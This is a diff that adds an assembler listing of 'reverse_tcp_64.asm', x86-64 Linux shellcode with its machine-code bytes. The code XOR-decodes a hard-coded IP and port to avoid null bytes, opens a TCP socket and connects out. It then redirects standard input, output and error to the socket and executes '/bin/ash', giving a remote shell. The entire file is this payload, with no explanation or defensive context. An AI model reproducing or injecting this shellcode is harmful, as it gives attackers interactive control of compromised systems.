@@ -1,0 +1,68 @@
+     1                                 %line 1+1 reverse_tcp_64.asm
+     2                                 [global _start]
+     3                                 
+     4                                 [section .text]
+     5                                 _start:
+     6                                 
+     7 00000000 4889E5                  mov rbp, rsp
+     8                                 
+     9                                 
+    10 00000003 4831C0                  xor rax, rax
+    11 00000006 4831C9                  xor rcx, rcx
+    12 00000009 4831D2                  xor rdx, rdx
+    13                                 
+    14                                 
+    15 0000000C 50                      push rax
+    16 0000000D B8FFFFFFFF              mov eax, 0xffffffff
+    17 00000012 BBF5FFFDFC              mov ebx, 0xfcfdfff5
+    18                                 
+    19 00000017 31C3                    xor ebx, eax
+    20 00000019 53                      push rbx
+    21 0000001A 6668270D                push word 0x0d27
+    22 0000001E 666A02                  push word 0x02
+    23                                 
+    24                                 
+    25 00000021 4831C0                  xor rax, rax
+    26 00000024 4831FF                  xor rdi, rdi
+    27 00000027 4831F6                  xor rsi, rsi
+    28 0000002A B029                    mov al, 0x29
+    29 0000002C 40B702                  mov dil, 0x02
+    30 0000002F 40B601                  mov sil, 0x01
+    31 00000032 0F05                    syscall
+    32 00000034 4889C7                  mov rdi, rax
+    33                                 
+    34                                 
+    35 00000037 4831C0                  xor rax, rax
+    36 0000003A B02A                    mov al, 0x2a
+    37 0000003C 4889E6                  mov rsi, rsp
+    38 0000003F 4889EA                  mov rdx, rbp
+    39 00000042 4829E2                  sub rdx, rsp
+    40 00000045 0F05                    syscall
+    41                                 
+    42                                 
+    43 00000047 4831C9                  xor rcx, rcx
+    44 0000004A B103                    mov cl, 0x03
+    45 0000004C 4889CE                  mov rsi, rcx
+    46                                 dup:
+    47 0000004F 4831C0                  xor rax, rax
+    48 00000052 B021                    mov al, 0x21
+    49 00000054 48FFCE                  dec rsi
+    50 00000057 0F05                    syscall
+    51 00000059 4889F1                  mov rcx, rsi
+    52 0000005C 48FFC1                  inc rcx
+    53 0000005F E2EC                    loop dup
+    54                                 
+    55                                 
+    56                                 
+    57 00000061 4831C0                  xor rax, rax
+    58 00000064 4831D2                  xor rdx, rdx
+    59 00000067 50                      push rax
+    60 00000068 682F62696E              push dword 0x6e69622f
+    61 0000006D C74424042F617368        mov dword [rsp+4], 0x6873612f
+    62                                 
+    63 00000075 4889E7                  mov rdi, rsp
+    64 00000078 50                      push rax
+    65 00000079 57                      push rdi
+    66 0000007A 4889E6                  mov rsi, rsp
+    67 0000007D B03B                    mov al, 0x3b
+    68 0000007F 0F05                    syscall
